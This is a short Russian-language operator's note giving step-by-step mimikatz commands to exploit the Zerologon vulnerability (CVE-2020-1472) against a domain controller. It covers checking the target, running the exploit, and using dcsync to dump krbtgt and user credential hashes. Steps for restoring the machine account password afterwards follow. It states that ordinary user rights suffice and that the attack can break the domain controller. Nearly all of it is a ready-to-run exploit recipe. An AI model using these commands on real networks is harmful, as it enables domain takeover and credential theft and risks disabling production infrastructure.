Входные данные:
- server 2016;
- машина в домене с позможностью запуска ПО;
- отсутствуют средства защиты, которые нельзя отключить.

Замечанияпо атаке:
- может сломать домен-контроллер (перестал работать RDP к dc);
- достаточно прав обычного пользователя.

1. Попытка провести атаку dcsync.
lsadump::dcsync /domain:company.ru /dc:dc.company.ru /user:krbtgt /authuser:dc$ /authdomain:company.ru /authpassword:"" /authntlm
Естественно, не успех.

2. Проверка возможности эксплуатации данной уязвимости.
lsadump::zerologon /target:dc.company.ru /account:dc$

3. Экслуатация.
lsadump::zerologon /target:dc.company.ru /account:dc$ /exploit

4. Атака dcsync.
lsadump::dcsync /domain:company.ru /dc:dc.company.ru /user:<<<username>>> /authuser:dc$ /authdomain:company.ru /authpassword:"" /authntlm

5. Восстановление пароля машины штатными средствами (https://winitpro.ru/index.php/2014/09/18/vosstanovlenie-doveritelnyx-otnoshenij-bez-perevvoda-v-domen/):
	5.1. Можно проверить, что связи с dc нет, с помощью nltest /sc_verify:<имя_домена>
	5.2. Зайти от локального администратора, я включил встроенного и заходил от него (надо проверить другие варианты).
	5.3. Есть много команд и командлетов для сброса пароля, но у меня сработал только этот:
		Reset-ComputerMachinePassword -Server dc -Credential company\Adm
	5.4. В статье говорят, что перезагружаться не надо. У меня так не сработало. RDP ожил только после перезагрузки.
	5.5. Повторно проверить наличие связи с dc (см. пункт 5.1).
	
Есть скрипт restorepassword.py (https://github.com/dirkjanm/CVE-2020-1472)
